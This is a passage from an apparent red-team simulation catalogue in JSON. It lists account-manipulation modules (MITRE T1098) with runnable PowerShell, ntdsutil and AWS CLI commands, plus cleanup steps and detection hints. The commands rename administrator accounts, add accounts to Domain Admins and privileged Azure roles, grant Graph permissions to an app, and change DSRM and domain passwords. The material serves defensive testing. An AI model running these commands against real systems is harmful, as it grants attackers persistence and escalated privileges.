        "command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n",
        "elevation_required": true,
        "cleanup_command": "$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\"\n  Set-LocalUser -Name $u.Name -Description $Matches.Description\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME\n}\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5598f7cb-cf43-455e-883a-f6008c5d46af",
      "module_name": "Admin Account Manipulate"
    },
    {
      "index": 612,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-RAGLOXTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-RAGLOXTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n",
        "elevation_required": false,
        "cleanup_command": "Get-ADUser -LDAPFilter \"(&(samaccountname=#{account_prefix}-*)(givenName=Test))\" | Remove-ADUser -Confirm:$False\n"
      },
      "variables": [
        {
          "name": "account_prefix",
          "description": "Prefix string of the random username (by default, atr-). Because the cleanup deletes such account based on\na match `(&(samaccountname=#{account_prefix}-*)(givenName=Test))`, if you are to change it, be careful.\n",
          "type": "string",
          "default_value": "atr-"
        },
        {
          "name": "group",
          "description": "Name of the group to alter",
          "type": "string",
          "default_value": "Domain Admins"
        },
        {
          "name": "create_args",
          "description": "Additional string appended to New-ADUser call",
          "type": "string",
          "default_value": ""
        }
      ],
      "prerequisites": [
        {
          "description": "PS Module ActiveDirectory\n",
          "check_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
          "install_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
        }
      ],
      "rx_module_id": "a55a22e9-a3d3-42ce-bd48-2653adb8f7a9",
      "module_name": "Domain Account and Group Manipulate"
    },
    {
      "index": 613,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Adversaries create AWS group, add users to specific to that group to elevate their privileges to gain more accesss\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws iam create-group --group-name #{username}\naws iam add-user-to-group --user-name #{username} --group-name #{username}\n",
        "elevation_required": false,
        "cleanup_command": "aws iam remove-user-from-group --user-name #{username} --group-name #{username}\naws iam delete-group --group-name #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Name of the AWS group to create",
          "type": "string",
          "default_value": "raglox"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if the user exists, we can only add a user to a group if the user exists.\n",
          "check_command": "aws iam list-users | grep #{username}\n",
          "install_command": "echo Please run RAGLOX module T1136.003, before running this RAGLOX module\n"
        }
      ],
      "rx_module_id": "8822c3b0-d9f9-4daf-a043-49f110a31122",
      "module_name": "AWS - Create a group and add a user to that group"
    },
    {
      "index": 614,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzureADUser -Filter \"DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "user_principal_name",
          "description": "Display Name, or User Principal Name, of the targeted user principal",
          "type": "string",
          "default_value": "SuperUser"
        },
        {
          "name": "role_name",
          "description": "Name of the targeted Azure AD role",
          "type": "string",
          "default_value": "Global Reader"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "0e65ae27-5385-46b4-98ac-607a8ee82261",
      "module_name": "Azure AD - adding user to Azure AD role"
    },
    {
      "index": 615,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq '#{service_principal_name}'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq '#{role_name}'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "service_principal_name",
          "description": "Name of the service principal",
          "type": "string",
          "default_value": "SuperSP"
        },
        {
          "name": "role_name",
          "description": "Name of the targeted Azure AD role",
          "type": "string",
          "default_value": "Global Reader"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "92c40b3f-c406-4d1f-8d2b-c039bf5009e4",
      "module_name": "Azure AD - adding service principal to Azure AD role"
    },
    {
      "index": 616,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "user_principal_name",
          "description": "Display Name, or User Principal Name, of the targeted user principal",
          "type": "string",
          "default_value": "SuperUser"
        },
        {
          "name": "role_name",
          "description": "Name of the targeted Azure role",
          "type": "string",
          "default_value": "Reader"
        },
        {
          "name": "subscription",
          "description": "Name of the targeted subscription",
          "type": "string",
          "default_value": "Azure subscription 1"
        }
      ],
      "prerequisites": [
        {
          "description": "Az.Resources module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Az.Resources -Force\n"
        }
      ],
      "rx_module_id": "1a94b3fc-b080-450a-b3d8-6d9b57b472ea",
      "module_name": "Azure - adding user to Azure role in subscription"
    },
    {
      "index": 617,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "service_principal_name",
          "description": "Name of the service principal",
          "type": "string",
          "default_value": "SuperSP"
        },
        {
          "name": "role_name",
          "description": "Name of the targeted Azure role",
          "type": "string",
          "default_value": "Reader"
        },
        {
          "name": "subscription",
          "description": "Name of the targeted subscription",
          "type": "string",
          "default_value": "Azure subscription 1"
        }
      ],
      "prerequisites": [
        {
          "description": "Az.Resources module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name Az.Resources -Force\n"
        }
      ],
      "rx_module_id": "c8f4bc29-a151-48da-b3be-4680af56f404",
      "module_name": "Azure - adding service principal to Azure role in subscription"
    },
    {
      "index": 618,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n",
        "elevation_required": false,
        "cleanup_command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure AD username",
          "type": "string",
          "default_value": "jonh@contoso.com"
        },
        {
          "name": "password",
          "description": "Azure AD password",
          "type": "string",
          "default_value": "p4sswd"
        },
        {
          "name": "application_name",
          "description": "Name of the targeted application that will be created",
          "type": "string",
          "default_value": "test_app"
        },
        {
          "name": "application_permission",
          "description": "Permission from Microsoft Graph Resource API that will be added to application",
          "type": "string",
          "default_value": "DirectoryRecommendations.Read.All"
        }
      ],
      "prerequisites": [
        {
          "description": "AzureAD module must be installed.\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        }
      ],
      "rx_module_id": "94ea9cc3-81f9-4111-8dde-3fb54f36af4b",
      "module_name": "Azure AD - adding permission to application"
    },
    {
      "index": 619,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ntdsutil \"set dsrm password\" \"sync from domain account #{sync_account}\" \"q\" \"q\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "sync_account",
          "description": "Account to sync password from",
          "type": "string",
          "default_value": "%username%"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d5b886d9-d1c7-4b6e-a7b0-460041bf2823",
      "module_name": "Password Change on Directory Service Restore Mode (DSRM) Account"
    },
    {
      "index": 620,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default value is 7 characters)",
          "type": "string",
          "default_value": "Uplow-1"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "fc5f9414-bd67-4f5f-a08e-e5381e29cbd1",
      "module_name": "Domain Password Policy Check: Short Password"
    },
    {
      "index": 621,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
      "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this RAGLOX module to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the raglox manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "new_password",
          "description": "The password to set for the current domain user (default is long and has upper and lower case and special character but no number)",
          "type": "string",
          "default_value": "UpperLowerLong-special"
        },
        {
          "name": "cred_file",
          "description": "A file containing the password of the current user",
          "type": "path",
          "default_value": "$env:LOCALAPPDATA\\RAGLOXRedTeam\\$env:USERNAME.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Password for current user must be stored in a credential file\n",
          "check_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"
        }
      ],
      "rx_module_id": "68190529-069b-4ffc-a942-919704158065",
      "module_name": "Domain Password Policy Check: No Number in Password"
    },
    {
      "index": 622,
      "technique_id": "T1098",
      "technique_name": "Account Manipulation",
